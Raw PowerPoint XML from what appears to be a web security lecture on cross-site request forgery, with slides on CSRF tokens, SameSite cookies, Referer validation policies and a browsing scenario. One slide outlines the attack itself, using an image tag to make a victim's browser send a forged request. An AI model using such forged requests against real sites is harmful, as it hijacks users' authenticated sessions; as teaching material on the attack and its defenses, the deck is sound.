      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="89103" name="object 15"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2902324" y="5074865"/>
            <a:ext cx="6681507" cy="8669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12700">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:lnSpc>
                <a:spcPct val="133000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2118">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Requests to the web server have predictable structure  Use e.g., </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2118">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;img src=…&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2118">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>to force victim to send it</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="175725281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1A639D-0669-BB05-4B7A-12B0F4809359}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Common defenses against CSRF</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0B4164E8-F14D-7EB2-23B1-638557123F28}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="396724" y="1490132"/>
            <a:ext cx="11398552" cy="5109091"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Nowadays, successfully finding and exploiting CSRF vulnerabilities often involves bypassing anti-CSRF measures deployed by the target website, the victim's browser, or both. The most common defenses you'll encounter are as follows: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>CSRF tokens</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> - A CSRF token is a unique, secret, and unpredictable value that is generated by the server-side application and shared with the client. When attempting to perform a sensitive action, such as submitting a form, the client must include the correct CSRF token in the request. This makes it very difficult for an attacker to construct a valid request on behalf of the victim. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>SameSite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t> cookies </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>SameSite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> is a browser security mechanism that determines when a website's cookies are included in requests originating from other websites. As requests to perform sensitive actions typically require an authenticated session cookie, the appropriate </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>SameSite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> restrictions may prevent an attacker from triggering these actions cross-site. Since 2021, Chrome enforces Lax </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>SameSite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> restrictions by default. As this is the proposed standard, we expect other major browsers to adopt this behavior in future. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>Referer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>-based validation </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>- Some applications make use of the HTTP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>Referer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> header to attempt to defend against CSRF attacks, normally by verifying that the request originated from the application's own domain. This is generally less effective than CSRF token validation.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="345893848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Prevention: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Referer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Validation</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Content Placeholder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t>The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0" err="1"/>
              <a:t>Referer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t> request header contains the address of the previous web page  from which a link to the currently requested page was followed. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t>The header  allows servers to identify where people are visiting from.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" spc="15" dirty="0">
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>REFERER are optional; not included by all browsers (Problem)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Two Policies </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" spc="10" dirty="0">
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Lenient </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" spc="45" dirty="0">
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>policy: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" spc="35" dirty="0">
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Block </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" spc="5" dirty="0">
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>if </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" spc="70" dirty="0">
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>bad, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" spc="10" dirty="0">
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>allow </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" spc="5" dirty="0">
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>if</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" spc="-150" dirty="0">
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" spc="30" dirty="0">
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>missing</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Strict policy: Block Unless good </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="98248277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4934791" y="44823"/>
            <a:ext cx="2322419" cy="380232"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8771" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr u="none" dirty="0"/>
              <a:t>I visit</a:t>
            </a:r>
            <a:r>
              <a:rPr u="none" spc="-49" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr spc="34" dirty="0"/>
              <a:t>reddit.com</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="92163" name="object 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="382137" y="4455739"/>
            <a:ext cx="11122926" cy="2402261"/>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defTabSz="715963">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="715963">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="715963">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="715963">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="715963">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="715963" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="715963" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="715963" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="715963" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="object 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3738563" y="4063533"/>
            <a:ext cx="4717676" cy="380232"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8771" defTabSz="631451">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2471" spc="-41" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Later, </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2471" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>I </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2471" spc="65" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>go </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2471" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>to</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2471" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2471" u="heavy" spc="21" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>reddit.com/r/security</a:t>
            </a:r>
            <a:endParaRPr sz="2471">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="92165" name="object 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2070287" y="6437779"/>
            <a:ext cx="2428875" cy="212912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId3"/>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defTabSz="715963">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="715963">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="715963">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="715963">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="715963">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="715963" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="715963" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="715963" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="715963" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="92166" name="object 6"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2103905" y="6454589"/>
            <a:ext cx="2361640" cy="142875"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 0 w 3459479"/>
              <a:gd name="T1" fmla="*/ 419 h 202565"/>
              <a:gd name="T2" fmla="*/ 0 w 3459479"/>
              <a:gd name="T3" fmla="*/ 330 h 202565"/>
              <a:gd name="T4" fmla="*/ 12 w 3459479"/>
              <a:gd name="T5" fmla="*/ 202 h 202565"/>
              <a:gd name="T6" fmla="*/ 43 w 3459479"/>
              <a:gd name="T7" fmla="*/ 97 h 202565"/>
              <a:gd name="T8" fmla="*/ 89 w 3459479"/>
              <a:gd name="T9" fmla="*/ 26 h 202565"/>
              <a:gd name="T10" fmla="*/ 146 w 3459479"/>
              <a:gd name="T11" fmla="*/ 0 h 202565"/>
              <a:gd name="T12" fmla="*/ 5516 w 3459479"/>
              <a:gd name="T13" fmla="*/ 0 h 202565"/>
              <a:gd name="T14" fmla="*/ 5574 w 3459479"/>
              <a:gd name="T15" fmla="*/ 26 h 202565"/>
              <a:gd name="T16" fmla="*/ 5620 w 3459479"/>
              <a:gd name="T17" fmla="*/ 97 h 202565"/>
              <a:gd name="T18" fmla="*/ 5651 w 3459479"/>
              <a:gd name="T19" fmla="*/ 202 h 202565"/>
              <a:gd name="T20" fmla="*/ 5663 w 3459479"/>
              <a:gd name="T21" fmla="*/ 330 h 202565"/>
              <a:gd name="T22" fmla="*/ 5663 w 3459479"/>
              <a:gd name="T23" fmla="*/ 419 h 202565"/>
              <a:gd name="T24" fmla="*/ 5651 w 3459479"/>
              <a:gd name="T25" fmla="*/ 546 h 202565"/>
              <a:gd name="T26" fmla="*/ 5620 w 3459479"/>
              <a:gd name="T27" fmla="*/ 651 h 202565"/>
              <a:gd name="T28" fmla="*/ 5574 w 3459479"/>
              <a:gd name="T29" fmla="*/ 722 h 202565"/>
              <a:gd name="T30" fmla="*/ 5516 w 3459479"/>
              <a:gd name="T31" fmla="*/ 748 h 202565"/>
              <a:gd name="T32" fmla="*/ 146 w 3459479"/>
              <a:gd name="T33" fmla="*/ 748 h 202565"/>
              <a:gd name="T34" fmla="*/ 89 w 3459479"/>
              <a:gd name="T35" fmla="*/ 722 h 202565"/>
              <a:gd name="T36" fmla="*/ 43 w 3459479"/>
              <a:gd name="T37" fmla="*/ 651 h 202565"/>
              <a:gd name="T38" fmla="*/ 12 w 3459479"/>
              <a:gd name="T39" fmla="*/ 546 h 202565"/>
              <a:gd name="T40" fmla="*/ 0 w 3459479"/>
              <a:gd name="T41" fmla="*/ 419 h 20256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3459479" h="202565">
                <a:moveTo>
